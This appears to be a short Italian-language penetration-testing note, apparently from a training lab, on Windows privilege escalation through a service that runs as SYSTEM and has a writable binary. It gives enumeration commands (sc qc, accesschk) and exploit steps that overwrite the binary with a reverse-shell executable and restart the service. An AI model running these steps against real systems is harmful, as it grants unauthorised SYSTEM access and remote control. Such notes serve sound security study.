### **ENUMERATION**
Vedi il servizio
```powershell
sc qc <NOME>
```
Nota che runna come System (SERVICE_START_NAME)
Nota che il binario del servizio è scrivibile (BINARY_PATH_NAME)
```powershell
C:\PrivEsc\accesschk.exe /accepteula -quvw "<PATH>"
```
### **EXPLOIT**
Copia una revers shell e sovrascrivi il file
```powershell
copy C:\PrivEsc\reverse.exe "<PATH>" /Y
```
Restarta il servizio
```powershell
net start <NOME>
```
